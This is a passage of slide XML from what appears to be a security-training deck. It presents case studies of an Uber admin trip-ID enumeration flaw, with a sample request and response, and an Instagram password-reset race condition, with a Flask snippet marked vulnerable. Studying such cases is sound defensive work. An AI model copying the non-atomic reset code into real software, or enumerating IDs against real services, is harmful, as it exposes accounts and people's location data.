      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10393085" y="2150864"/>
            <a:ext cx="3507105" cy="788194"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10515362" y="2273141"/>
            <a:ext cx="1505069" cy="188119"/>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Trip Data Discovery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10515362" y="2527459"/>
            <a:ext cx="3262551" cy="289322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Identified trip viewing functionality with sequential numeric identifiers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6819781" y="3005257"/>
            <a:ext cx="7080409" cy="643533"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7484"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6942058" y="3127534"/>
            <a:ext cx="1505069" cy="188119"/>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Enumeration Testing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6942058" y="3381851"/>
            <a:ext cx="6835854" cy="144661"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Confirmed ability to access arbitrary trip records by incrementing trip IDs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6819781" y="3723323"/>
            <a:ext cx="7080409" cy="144661"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Sample Request:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6819781" y="3942517"/>
            <a:ext cx="7080409" cy="2197179"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6814066" y="3942517"/>
            <a:ext cx="7091839" cy="2197179"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 783"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6928723" y="4028480"/>
            <a:ext cx="6862524" cy="2025253"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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GET /admin/trips/12345</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Authorization: Bearer admin_token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Response:</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"tripId": 12345,</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"riderId": 789,</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"driverId": 456,</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"pickupLocation": "123 Main St, San Francisco",</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"dropoffLocation": "456 Market St, San Francisco",</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"fare": 25.50,</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"timestamp": "2016-05-15T14:30:00Z",</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  "routeCoordinates": [...]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6819781" y="6214229"/>
            <a:ext cx="7080409" cy="433983"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Privacy Implications:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> This vulnerability exposed complete movement patterns of high-profile individuals, including celebrities, politicians, and executives. Historical trip data could reveal home addresses, work locations, frequented venues, and personal routines. The tool had been reportedly misused by Uber employees to track ex-partners, celebrities, and journalists.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="705683" y="6817519"/>
            <a:ext cx="1806059" cy="225743"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Broader Context</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="705683" y="7142559"/>
            <a:ext cx="13219033" cy="289322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>This incident highlighted systemic issues with insider access controls. Uber subsequently implemented comprehensive audit logging, strict access controls with need-to-know principles, automated anomaly detection for admin actions, and regular security training for employees with elevated privileges.</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1981" y="746998"/>
            <a:ext cx="5907405" cy="326350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Instagram Password Reset Race Condition (2020)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611981" y="1180624"/>
            <a:ext cx="921306" cy="155019"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 21555"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>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1632" y="1218367"/>
            <a:ext cx="79534" cy="79534"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="790932" y="1210389"/>
            <a:ext cx="682704" cy="95488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RACE CONDITION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1582936" y="1173004"/>
            <a:ext cx="699611" cy="170259"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 19626"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="007EBD"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1650206" y="1210389"/>
            <a:ext cx="565071" cy="95488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$30K BOUNTY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611981" y="1399222"/>
            <a:ext cx="13406437" cy="119301"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Company:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Instagram (Facebook) | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Date:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> 2020 | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerability Type:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Race condition combined with IDOR in password reset flow | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Bounty Paid:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> $30,000 | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Severity:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Critical - Account takeover vulnerability affecting all Instagram users</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611981" y="1624251"/>
            <a:ext cx="1596866" cy="195858"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerability Analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611981" y="1869877"/>
            <a:ext cx="6581894" cy="357902"/>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Instagram's password reset implementation contained a critical race condition. The code checked if a reset code had been used and marked it as consumed, but these operations weren't atomic. This created a timing window where multiple requests could simultaneously pass the "not used" check before any marked the code as consumed.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611981" y="2283738"/>
            <a:ext cx="6581894" cy="3847386"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1086"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="607100" y="2283738"/>
            <a:ext cx="6591657" cy="3847386"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 388"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="706517" y="2358271"/>
            <a:ext cx="6392823" cy="3698319"/>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Instagram password reset - VULNERABLE</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@app.route('/api/reset-password', </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methods=['POST'])</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def reset_password():</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data = request.get_json()</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reset_code = data.get('code')</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new_password = data.get('password')</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 Verify reset code</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reset_request = ResetRequest.query\</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.filter_by(code=reset_code).first()</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if reset_request and not reset_request.used:</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 RACE CONDITION WINDOW HERE</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 Multiple requests can pass this check</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 before any marks the code as used</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reset_request.used = True</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db.session.commit()</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 Update password</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user = User.query.get(</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reset_request.user_id)</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user.password = hash_password(new_password)</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db.session.commit()</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return jsonify({'status': 'success'})</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return jsonify({</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'status': 'invalid code'</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 400</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="1624251"/>
            <a:ext cx="1566267" cy="195858"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack Sequence</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="1876068"/>
            <a:ext cx="99417" cy="124301"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="900"/>
              </a:lnSpc>
